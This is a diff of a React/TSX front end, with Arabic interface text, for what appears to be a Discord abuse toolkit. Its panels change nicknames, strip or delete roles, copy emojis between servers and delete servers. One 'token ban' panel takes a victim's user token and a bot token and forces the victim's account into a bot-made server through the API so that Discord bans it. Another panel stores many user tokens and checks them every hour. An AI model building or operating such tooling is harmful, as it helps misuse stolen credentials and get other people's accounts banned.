+                  <ActionBtn text="🗑️ حذف الرتبة" loading={loading} color="orange" onClick={async () => { if (!rmToken || !rmGuildId || !rmRoleId) { setResult('❌ أدخل التوكن + السيرفر + الرتبة'); return }; setLoading(true); setResult(''); setProgress('🗑️ جاري حذف الرتبة...'); try { const res = await fetch('/api/roles-manager', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: rmToken, guildId: rmGuildId, roleId: rmRoleId, action: 'delete_role' }) }); const data = await res.json(); if (data.success) { setResult('✅ تم حذف الرتبة بنجاح') } else { setResult('❌ ' + (data.error || 'فشل حذف الرتبة')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                </div>
+                <div className="bg-rose-500/5 rounded-xl p-3 border border-rose-500/10">
+                  <div className="text-[10px] text-rose-400/60 space-y-1">
+                    <p>💡 <span className="text-rose-400/80 font-bold">ملاحظة:</span></p>
+                    <p>• التوكن يحتاج صلاحية Manage Roles في السيرفر</p>
+                    <p>• إعطاء/سحب رتبة من الكل = 50 عضو بالتوازي</p>
+                    <p>• حذف الرتبة يحذفها نهائياً من السيرفر</p>
+                  </div>
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== NICKNAME CHANGER ==================== */}
+            {section === 'nickname-changer' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-lime-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">✏️</span><h2 className="text-xl font-black text-lime-400">تغيير نك</h2></div>
+                <p className="text-slate-500 text-sm mb-5">تغيير اسمك (النك نيم) في أي سيرفر - يدعم نص عادي وإيموجي</p>
+                <TokenInput label="🎫 التوكن" value={ncToken} onChange={setNcToken} accent="lime" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={ncGuildId} onChange={setNcGuildId} placeholder="Server ID" accent="lime" />
+                <div className="mb-4"><label className="text-[11px] text-lime-300/70 mb-1 block">✏️ النك نيم الجديد</label><input type="text" value={ncNickname} onChange={e => setNcNickname(e.target.value)} maxLength={32} placeholder="النك نيم الجديد" className="w-full bg-black/30 border border-lime-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-lime-700/30 focus:outline-none focus:border-lime-400/50 transition-colors" /><div className="text-right text-[10px] text-lime-600/50 mt-1">{ncNickname.length}/32</div></div>
+                <div className="grid grid-cols-2 gap-2">
+                  <ActionBtn text="✏️ تغيير النك" loading={loading} color="lime" onClick={async () => { if (!ncToken || !ncGuildId || !ncNickname) { setResult('❌ أدخل التوكن + السيرفر + النك'); return }; setLoading(true); setResult(''); setProgress('✏️ جاري تغيير النك...'); try { const res = await fetch('/api/nickname-changer', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: ncToken, guildId: ncGuildId, nickname: ncNickname }) }); const data = await res.json(); if (data.success) { setResult('✅ تم تغيير النك نيم بنجاح') } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                  <ActionBtn text="🗑️ حذف النك" loading={loading} color="red" onClick={async () => { if (!ncToken || !ncGuildId) { setResult('❌ أدخل التوكن + السيرفر'); return }; setLoading(true); setResult(''); setProgress('🗑️ جاري حذف النك...'); try { const res = await fetch('/api/nickname-changer', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: ncToken, guildId: ncGuildId, nickname: '' }) }); const data = await res.json(); if (data.success) { setResult('✅ تم حذف النك نيم بنجاح') } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== EMOJI STEALER ==================== */}
+            {section === 'emoji-stealer' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-amber-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">😀</span><h2 className="text-xl font-black text-amber-400">سرقة إيموجي</h2></div>
+                <p className="text-slate-500 text-sm mb-5">نسخ كل إيموجي سيرفر ونقلها لسيرفر آخر - عادية ومتحركة (GIF)</p>
+                <TokenInput label="🎫 التوكن" value={esToken} onChange={setEsToken} accent="amber" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="📥 أيدي المصدر" value={esSourceGuild} onChange={setEsSourceGuild} placeholder="Source Server ID" accent="amber" />
+                <TextInput label="📤 أيدي الهدف" value={esTargetGuild} onChange={setEsTargetGuild} placeholder="Target Server ID" accent="amber" />
+                <ActionBtn text="😀 بدء سرقة الإيموجي" loading={loading} color="amber" onClick={async () => {
+                  if (!esToken || !esSourceGuild || !esTargetGuild) { setResult('❌ أدخل التوكن + المصدر + الهدف'); return }
+                  setLoading(true); setResult(''); setProgress('😀 جاري نسخ الإيموجي...')
+                  try {
+                    const res = await fetch('/api/emoji-stealer', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: esToken, sourceGuildId: esSourceGuild, targetGuildId: esTargetGuild }) })
+                    const data = await res.json()
+                    if (data.success) {
+                      const parts = [`✅ تم نسخ ${data.copied}/${data.total} إيموجي`];
+                      if (data.skipped > 0) parts.push(`تم تخطي: ${data.skipped}`);
+                      if (data.failed > 0) parts.push(`فشل: ${data.failed}`);
+                      setResult(parts.join(' | '))
+                    } else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+                <div className="mt-4 bg-amber-500/5 rounded-xl p-3 border border-amber-500/10">
+                  <div className="text-[10px] text-amber-400/60 space-y-1">
+                    <p>💡 <span className="text-amber-400/80 font-bold">ملاحظة:</span></p>
+                    <p>• يحتاج صلاحية Manage Emojis في سيرفر الهدف</p>
+                    <p>• الإيموجي المتحركة (GIF) تحتاج نيترو في الهدف</p>
+                    <p>• الحد الأقصى 50 إيموجي عادي + 50 متحرك لكل سيرفر</p>
+                  </div>
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== TOKEN BAN ==================== */}
+            {section === 'token-ban' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚫</span><h2 className="text-xl font-black text-red-400">تبنيد حساب من توكن</h2></div>
+                <p className="text-slate-500 text-sm mb-5">حظر حساب ضحية - يدخل حساب الضحية سيرفر البوت عن طريق API وديسكورد يكتشف ويبند الحساب</p>
+                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
+                  <div className="text-[11px] text-red-400/80 space-y-1.5">
+                    <p>⚠️ <span className="font-bold">كيف يعمل:</span></p>
+                    <p>1. تضع توكن الحساب المراد تبنيده (User Token)</p>
+                    <p>2. تضع توكن أي بوت عندك (Bot Token)</p>
+                    <p>3. الموقع يصنع سيرفر جديد بالبوت ويعمل دعوة</p>
+                    <p>4. يدخل حساب الضحية لسيرفر البوت عن طريق API (مو العادي)</p>
+                    <p>5. ديسكورد يكتشف إن الحساب دخل سيرفر عبر API ويسحبه ويحظره</p>
+                    <p>6. السيرفر يبقى موجود - ما يتم حذفه</p>
+                  </div>
+                </div>
+                <div className="space-y-4 mb-5">
+                  <div>
+                    <label className="text-[11px] text-red-300/70 mb-1 block">👤 توكن الضحية (User Token)</label>
+                    <div className="relative">
+                      <input type="password" value={tbUserToken} onChange={e => setTbUserToken(e.target.value)} placeholder="توكن الحساب المراد تبنيده..." className="w-full bg-black/30 border border-red-500/30 rounded-xl px-4 py-3 pr-10 text-white text-sm placeholder-red-700/30 focus:outline-none focus:border-red-400/50 transition-colors" />
+                      <span className="absolute right-3 top-1/2 -translate-y-1/2 text-red-500/40 text-sm">👤</span>
+                    </div>
+                  </div>
+                  <div>
+                    <label className="text-[11px] text-purple-300/70 mb-1 block">🤖 توكن البوت (Bot Token)</label>
+                    <div className="relative">
+                      <input type="password" value={tbBotToken} onChange={e => setTbBotToken(e.target.value)} placeholder="توكن أي بوت عندك..." className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 pr-10 text-white text-sm placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 transition-colors" />
+                      <span className="absolute right-3 top-1/2 -translate-y-1/2 text-purple-500/40 text-sm">🤖</span>
+                    </div>
+                  </div>
+                </div>
+                <ActionBtn text="🚫 تبنيد الحساب" loading={loading} color="red" onClick={async () => {
+                  if (!tbUserToken) { setResult('❌ أدخل توكن الضحية'); return }
+                  if (!tbBotToken) { setResult('❌ أدخل توكن البوت'); return }
+                  setLoading(true); setResult(''); setProgress('🚫 جاري تبنيد الحساب...')
+                  try {
+                    const res = await fetch('/api/token-ban', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ userToken: tbUserToken, botToken: tbBotToken }), signal: AbortSignal.timeout(120000) })
+                    const data = await res.json()
+                    if (data.success) {
+                      const lines = data.steps || []
+                      setResult(lines.join('\n'))
+                      if (data.victim) setStats({ banned: 1 })
+                    } else { setResult('❌ ' + (data.error || 'فشل')) }
+                  } catch { setResult('❌ خطأ في الاتصال') }
+                  setLoading(false); setProgress('')
+                }} />
+                <div className="mt-4 bg-amber-500/5 rounded-xl p-3 border border-amber-500/10">
+                  <div className="text-[10px] text-amber-400/60 space-y-1">
+                    <p>💡 <span className="text-amber-400/80 font-bold">ملاحظات:</span></p>
+                    <p>• السيرفر يبقى موجود بعد العملية - ما يتم حذفه</p>
+                    <p>• البوت محدود 10 سيرفرات يومياً في إنشاء سيرفرات</p>
+                    <p>• ديسكورد يكتشف الدخول عبر API ويحظر الحساب تلقائياً</p>
+                    <p>• الحظر قد يأخذ من دقائق لساعات حسب نظام ديسكورد</p>
+                  </div>
+                </div>
+              </div></div>
+            )}
+
+            {/* ==================== TOKEN SAVE ==================== */}
+            {section === 'token-save' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-indigo-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💾</span><h2 className="text-xl font-black text-indigo-400">حفظ توكنات</h2></div>
+                <p className="text-slate-500 text-sm mb-4">احفظ أكثر من توكن - فحص تلقائي كل ساعة - يخبرك لو تغير أو تعطل</p>
+
+                {/* زر كيف تجيب توكن */}
+                <button onClick={() => setShowTokenGuide(true)} className="w-full py-2.5 rounded-xl text-[11px] text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer mb-4 flex items-center justify-center gap-2 font-bold">
+                  <span>🎫</span> كيف تجيب توكن؟
+                </button>
+
+                {/* إضافة توكن جديد */}
+                <div className="mb-4">
+                  <label className="text-[11px] text-indigo-300/70 mb-1 block">🎫 أضف توكن جديد</label>
+                  <div className="flex gap-2">
+                    <input type="password" value={newTokenInput} onChange={e => setNewTokenInput(e.target.value)} placeholder="الصق التوكن هنا..." className="flex-1 bg-black/30 border border-indigo-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-indigo-700/30 focus:outline-none focus:border-indigo-400/50 transition-colors" />
+                    <button onClick={async () => {
+                      const tk = newTokenInput.trim()
+                      if (!tk || tk.length < 50) { setResult('❌ أدخل توكن صالح'); return }
+                      if (savedTokens.some(st => st.token === tk)) { setResult('❌ هذا التوكن محفوظ بالفعل'); return }
+                      const tempId = 'temp_' + Date.now()
+                      setSavedTokens(prev => [...prev, { id: tempId, token: tk, name: 'جاري الفحص...', type: '', status: 'checking', addedAt: new Date().toLocaleString('ar-SA'), lastChecked: '' }])
+                      setNewTokenInput('')
+                      try {
+                        const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: tk }) })
+                        const data = await res.json()
+                        if (data.success) {
+                          const entry: SavedTokenEntry = { id: tempId, token: tk, name: data.name, type: data.type, email: data.email, nitro: data.nitro, status: 'valid', addedAt: new Date().toLocaleString('ar-SA'), lastChecked: new Date().toLocaleTimeString('ar-SA') }
+                          setSavedTokens(prev => prev.map(st => st.id === tempId ? entry : st))
+                          setResult(`✅ تم حفظ التوكن - ${data.name} (${data.type === 'bot' ? '🤖 بوت' : '👤 يوزر'})`)
+                        } else {
+                          setSavedTokens(prev => prev.filter(st => st.id !== tempId))
+                          setResult('❌ التوكن غير صالح أو منتهي')
+                        }
+                      } catch { setSavedTokens(prev => prev.filter(st => st.id !== tempId)); setResult('❌ خطأ في الاتصال') }
+                    }} disabled={tsCheckingAll} className="px-4 py-3 rounded-xl font-bold text-xs cursor-pointer bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 hover:bg-indigo-500/30 transition-colors active:scale-[0.97] whitespace-nowrap disabled:opacity-50 disabled:cursor-not-allowed">💾 حفظ</button>
+                  </div>
+                </div>
+
+                {/* أزرار التحكم */}
+                <div className="grid grid-cols-2 gap-2 mb-4">
+                  <ActionBtn text={tsCheckingAll ? '⏳ جاري الفحص...' : '🔍 فحص الكل'} loading={tsCheckingAll} color="cyan" onClick={async () => {
+                    if (savedTokens.length === 0) { setResult('❌ لا يوجد توكنات محفوظة'); return }
+                    setTsCheckingAll(true); setResult('')
+                    for (const t of savedTokens) {
+                      setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'checking' as const } : st))
+                      try {
+                        const res = await fetch('/api/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t.token }) })
+                        const data = await res.json()
+                        setSavedTokens(prev => prev.map(st => {
+                          if (st.id !== t.id) return st
+                          if (data.success) {
+                            if (t.name && t.name !== data.name && t.name !== 'جاري الفحص...') return { ...st, name: data.name, status: 'changed' as const, lastChecked: new Date().toLocaleTimeString('ar-SA'), prevName: t.name }
+                            return { ...st, name: data.name, status: 'valid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
+                          }
+                          return { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') }
+                        }))
+                      } catch { setSavedTokens(prev => prev.map(st => st.id === t.id ? { ...st, status: 'invalid' as const, lastChecked: new Date().toLocaleTimeString('ar-SA') } : st)) }
+                      await new Promise(r => setTimeout(r, 1500))
+                    }
+                    setTsCheckingAll(false)
+                    const changed = savedTokens.filter(t => t.status === 'changed')
+                    const invalid = savedTokens.filter(t => t.status === 'invalid')
+                    setResult(`✅ تم فحص ${savedTokens.length} توكن${changed.length > 0 ? ` | ⚠️ ${changed.length} تغير` : ''}${invalid.length > 0 ? ` | ❌ ${invalid.length} معطل` : ''}`)
+                  }} />
+                  <button onClick={() => { if (savedTokens.length === 0) { setResult('❌ لا يوجد توكنات'); return }; setSavedTokens([]); setResult('🗑️ تم حذف جميع التوكنات') }} className="w-full py-3 rounded-xl font-bold text-xs transition-all cursor-pointer border active:scale-[0.97] bg-red-500/10 text-red-400 border-red-500/20 hover:bg-red-500/20">🗑️ حذف الكل</button>
+                </div>
+
+                {/* مؤشر الفحص التلقائي */}
+                <div className="bg-green-500/5 rounded-xl p-3 border border-green-500/15 mb-4 flex items-center gap-3">
+                  <div className="relative flex items-center justify-center">
+                    <div className="w-2.5 h-2.5 rounded-full bg-green-500" />
+                    <div className="absolute w-2.5 h-2.5 rounded-full bg-green-500 animate-ping" />
+                  </div>
+                  <div className="flex-1">
+                    <p className="text-[11px] text-green-400 font-bold">فحص تلقائي كل ساعة</p>
+                    <p className="text-[9px] text-green-500/40">{savedTokens.length} توكن محفوظ - يتم فحصهم تلقائياً</p>
+                  </div>
+                </div>
+
+                {/* قائمة التوكنات */}
+                {savedTokens.length > 0 ? (
+                  <div className="space-y-2 max-h-96 overflow-y-auto">
+                    {savedTokens.map((st) => (
+                      <div key={st.id} className={`rounded-xl p-3 border animate-fade-in ${st.status === 'valid' ? 'bg-green-500/5 border-green-500/15' : st.status === 'invalid' ? 'bg-red-500/5 border-red-500/15' : st.status === 'changed' ? 'bg-yellow-500/5 border-yellow-500/15' : 'bg-indigo-500/5 border-indigo-500/15'}`}>
+                        <div className="flex items-center gap-3">
+                          <div className="text-xl">{st.type === 'bot' ? '🤖' : '👤'}</div>
+                          <div className="flex-1 min-w-0">
+                            <div className="flex items-center gap-2">
+                              <span className="text-xs font-bold text-white truncate">{st.name}</span>
+                              {st.prevName && <span className="text-[9px] text-yellow-400/60 truncate">(كان: {st.prevName})</span>}
+                            </div>
+                            <div className="flex items-center gap-2 mt-0.5">
+                              <span className="text-[9px] text-white/30 font-mono">{st.token.substring(0, 20)}...</span>
+                              {st.email && <span className="text-[9px] text-indigo-300/40 truncate">{st.email}</span>}
+                            </div>
+                          </div>
+                          <div className="flex items-center gap-1.5 flex-shrink-0">
+                            <div className={`text-[9px] px-2 py-1 rounded-lg font-bold ${st.status === 'valid' ? 'bg-green-500/20 text-green-400' : st.status === 'invalid' ? 'bg-red-500/20 text-red-400' : st.status === 'changed' ? 'bg-yellow-500/20 text-yellow-400' : 'bg-indigo-500/20 text-indigo-400 animate-pulse'}`}>
+                              {st.status === 'valid' ? '✅ شغال' : st.status === 'invalid' ? '❌ معطل' : st.status === 'changed' ? '⚠️ تغير' : '🔄 فحص'}
+                            </div>
+                            <button onClick={() => { setSavedTokens(prev => prev.filter(s => s.id !== st.id)); setResult(`🗑️ تم حذف: ${st.name}`) }} className="text-[10px] text-red-400/60 bg-red-500/5 px-2 py-1 rounded-lg hover:bg-red-500/15 transition-colors cursor-pointer">✕</button>
+                          </div>
+                        </div>
+                        {st.lastChecked && <div className="text-[9px] text-white/20 mt-1.5">آخر فحص: {st.lastChecked} | أضيف: {st.addedAt}</div>}
+                        {st.prevName && st.status === 'changed' && (
+                          <div className="mt-2 bg-yellow-500/10 rounded-lg p-2 border border-yellow-500/15">
+                            <p className="text-[10px] text-yellow-400">⚠️ تم تغيير اسم الحساب! من "{st.prevName}" إلى "{st.name}"</p>
+                          </div>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                ) : (
+                  <div className="bg-white/3 rounded-xl p-6 border border-white/5 text-center">
+                    <div className="text-4xl mb-2">🔒</div>
+                    <p className="text-xs text-white/30 mb-1">لا يوجد توكنات محفوظة</p>
+                    <p className="text-[10px] text-white/20">ضع توكن فوق واضغط حفظ - راح يثبت ويتراقب تلقائياً</p>
+                  </div>
+                )}
+              </div></div>
+            )}
+
+            {/* ==================== DELETE SERVER ==================== */}
+            {section === 'delete-server' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🗑️</span><h2 className="text-xl font-black text-red-400">حذف سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">⚠️ حذف سيرفر نهائياً - يجب أن تكون المالك</p>
+                <TokenInput label="🎫 التوكن" value={deleteSrvToken} onChange={setDeleteSrvToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={deleteSrvId} onChange={setDeleteSrvId} placeholder="Server ID" accent="red" />
+                <ActionBtn text="🗑️ حذف السيرفر نهائياً" loading={loading} color="red" onClick={async () => { if (!deleteSrvToken || !deleteSrvId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setResult(''); setProgress('🗑️ جاري حذف السيرفر...'); try { const res = await fetch('/api/delete-server', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: deleteSrvToken, guildId: deleteSrvId }) }); const data = await res.json(); if (data.success) { setResult('✅ ' + (data.message || 'تم حذف السيرفر!')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+              </div></div>
+            )}
+
+            {/* ===== RESULT ===== */}
+            {result && (<div className={`mt-4 p-4 rounded-2xl text-sm font-medium border animate-fade-in whitespace-pre-line ${result.startsWith('✅') ? 'bg-green-500/10 text-green-400 border-green-500/20 text-left' : 'bg-red-500/10 text-red-400 border-red-500/20 text-center'}`}>{result}</div>)}
+
+            {/* ===== STATS ===== */}
+            {stats && (<div className="mt-4 glass-card rounded-2xl p-4 border border-slate-700/30 animate-fade-in"><div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-center">
+              {stats.deleted !== undefined && stats.deleted > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.deleted}</div><div className="text-[10px] text-red-300/60">محذوف</div></div>)}
+              {stats.created !== undefined && stats.created > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.created}</div><div className="text-[10px] text-green-300/60">منشأ</div></div>)}
+              {stats.spam_sent !== undefined && stats.spam_sent > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.spam_sent}</div><div className="text-[10px] text-orange-300/60">سبام</div></div>)}
+              {stats.banned !== undefined && stats.banned > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-500 stat-number">{stats.banned}</div><div className="text-[10px] text-red-400/60">محظور</div></div>)}
+              {stats.roles !== undefined && stats.roles > 0 && (<div className="bg-purple-500/8 rounded-xl p-3 border border-purple-500/10"><div className="text-2xl font-black text-purple-400 stat-number">{stats.roles}</div><div className="text-[10px] text-purple-300/60">رتب</div></div>)}
+              {stats.sent !== undefined && stats.sent > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.sent}</div><div className="text-[10px] text-green-300/60">مرسلة</div></div>)}
+              {stats.failed !== undefined && stats.failed > 0 && (<div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10"><div className="text-2xl font-black text-red-400 stat-number">{stats.failed}</div><div className="text-[10px] text-red-300/60">فشل</div></div>)}
+              {stats.blocked !== undefined && stats.blocked > 0 && (<div className="bg-yellow-500/8 rounded-xl p-3 border border-yellow-500/10"><div className="text-2xl font-black text-yellow-400 stat-number">{stats.blocked}</div><div className="text-[10px] text-yellow-300/60">محظور DM</div></div>)}
+              {stats.left !== undefined && stats.left > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.left}</div><div className="text-[10px] text-orange-300/60">مغادرة</div></div>)}
+              {stats.txt !== undefined && stats.txt > 0 && (<div className="bg-blue-500/8 rounded-xl p-3 border border-blue-500/10"><div className="text-2xl font-black text-blue-400 stat-number">{stats.txt}</div><div className="text-[10px] text-blue-300/60">روم كتابي</div></div>)}
+              {stats.voice !== undefined && stats.voice > 0 && (<div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10"><div className="text-2xl font-black text-green-400 stat-number">{stats.voice}</div><div className="text-[10px] text-green-300/60">روم صوتي</div></div>)}
+              {stats.cats !== undefined && stats.cats > 0 && (<div className="bg-indigo-500/8 rounded-xl p-3 border border-indigo-500/10"><div className="text-2xl font-black text-indigo-400 stat-number">{stats.cats}</div><div className="text-[10px] text-indigo-300/60">كاتيجوري</div></div>)}
+              {stats.emojis !== undefined && stats.emojis > 0 && (<div className="bg-pink-500/8 rounded-xl p-3 border border-pink-500/10"><div className="text-2xl font-black text-pink-400 stat-number">{stats.emojis}</div><div className="text-[10px] text-pink-300/60">إيموجي</div></div>)}
+              {stats.kicked !== undefined && stats.kicked > 0 && (<div className="bg-orange-500/8 rounded-xl p-3 border border-orange-500/10"><div className="text-2xl font-black text-orange-400 stat-number">{stats.kicked}</div><div className="text-[10px] text-orange-300/60">مطرود</div></div>)}
+              {stats.permissions !== undefined && stats.permissions > 0 && (<div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10"><div className="text-2xl font-black text-cyan-400 stat-number">{stats.permissions}</div><div className="text-[10px] text-cyan-300/60">صلاحية</div></div>)}
+            </div></div>)}
+
+          </div>
+        </main>
+        <TokenGuideModal show={showTokenGuide} onClose={() => setShowTokenGuide(false)} onTokenExtracted={(token) => { setVerifyToken(token); setShowTokenGuide(false); }} />
+        <ProfileModal show={showProfile} onClose={() => setShowProfile(false)} />
+      </div>
+      </>
+      )}
+    </div>
+  )
+}
+
+/* ==================== UI COMPONENTS ==================== */
+
+function TokenInput({ label, value, onChange, accent = 'green', onHelp }: { label: string; value: string; onChange: (v: string) => void; accent?: string; onHelp?: () => void }) {
+  const [showPw, setShowPw] = useState(false)
+  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50' }
+  return (<div className="mb-4"><div className="flex items-center justify-between mb-1"><label className="text-[11px] text-white/50">{label}</label>{onHelp && (<button onClick={onHelp} className="text-[10px] text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded-md border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">📖 كيف تجيب التوكن؟</button>)}</div><div className="relative"><input type={showPw ? 'text' : 'password'} value={value} onChange={e => onChange(e.target.value)} placeholder="••••••••" className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm pr-16 placeholder-white/20 focus:outline-none transition-colors`} /><div className="absolute right-2 top-1/2 -translate-y-1/2 flex gap-1"><button onClick={() => setShowPw(!showPw)} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">{showPw ? '🙈' : '👁'}</button><button onClick={() => { navigator.clipboard.writeText(value).catch(() => { const inp = document.createElement('input'); inp.value = value; document.body.appendChild(inp); inp.select(); document.execCommand('copy'); document.body.removeChild(inp); }); }} className="text-[10px] text-white/40 bg-white/5 px-2 py-1 rounded-lg hover:bg-white/10 transition-colors cursor-pointer border border-white/10">📋</button></div></div></div>)
+}
+
+function TextInput({ label, value, onChange, placeholder, accent = 'green', type = 'text' }: { label: string; value: string; onChange: (v: string) => void; placeholder: string; accent?: string; type?: string }) {
+  const colors: Record<string, string> = { green: 'border-green-500/30 focus:border-green-400/50', red: 'border-red-500/30 focus:border-red-400/50', orange: 'border-orange-500/30 focus:border-orange-400/50', purple: 'border-purple-500/30 focus:border-purple-400/50', yellow: 'border-yellow-500/30 focus:border-yellow-400/50', cyan: 'border-cyan-500/30 focus:border-cyan-400/50', pink: 'border-pink-500/30 focus:border-pink-400/50', amber: 'border-amber-500/30 focus:border-amber-400/50', emerald: 'border-emerald-500/30 focus:border-emerald-400/50' }
+  return (<div className="mb-4"><label className="text-[11px] text-white/50 mb-1 block">{label}</label><input type={type} value={value} onChange={e => onChange(e.target.value)} placeholder={placeholder} className={`w-full bg-black/30 border ${colors[accent] || colors.green} rounded-xl px-4 py-3 text-white text-sm placeholder-white/20 focus:outline-none transition-colors`} /></div>)
+}
+
+function ActionBtn({ text, loading, onClick, color = 'green' }: { text: string; loading: boolean; onClick: () => void; color?: string }) {
+  const colors: Record<string, string> = { green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30', amber: 'bg-amber-500/20 hover:bg-amber-500/30 text-amber-400 border-amber-500/30' }
+  return (<button onClick={onClick} disabled={loading} className={`w-full py-3 rounded-xl font-bold text-sm transition-all cursor-pointer border ${colors[color] || colors.green} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳ جاري...' : text}</button>)
+}
+
+function NukerBtn({ text, color, loading, onClick }: { text: string; color: string; loading: boolean; onClick: () => void }) {
+  const colors: Record<string, string> = { red: 'bg-red-500/20 hover:bg-red-500/30 text-red-400 border-red-500/30', gray: 'bg-white/5 hover:bg-white/10 text-white/70 border-white/10', orange: 'bg-orange-500/20 hover:bg-orange-500/30 text-orange-400 border-orange-500/30', cyan: 'bg-cyan-500/20 hover:bg-cyan-500/30 text-cyan-400 border-cyan-500/30', purple: 'bg-purple-500/20 hover:bg-purple-500/30 text-purple-400 border-purple-500/30', yellow: 'bg-yellow-500/20 hover:bg-yellow-500/30 text-yellow-400 border-yellow-500/30', green: 'bg-green-500/20 hover:bg-green-500/30 text-green-400 border-green-500/30', pink: 'bg-pink-500/20 hover:bg-pink-500/30 text-pink-400 border-pink-500/30' }
+  return (<button onClick={onClick} disabled={loading} className={`w-full py-2.5 rounded-xl font-bold text-xs transition-all cursor-pointer border ${colors[color] || colors.gray} ${loading ? 'opacity-50 cursor-not-allowed' : 'active:scale-[0.98]'}`}>{loading ? '⏳' : text}</button>)
+}
+
+function InfoPill({ label, value }: { label: string; value: string }) {
+  return (<div className="bg-black/20 rounded-xl px-3 py-2 border border-white/5 text-center"><div className="text-[10px] text-white/40">{label}</div><div className="text-xs text-green-300 font-medium mt-0.5">{value}</div></div>)
+}
+
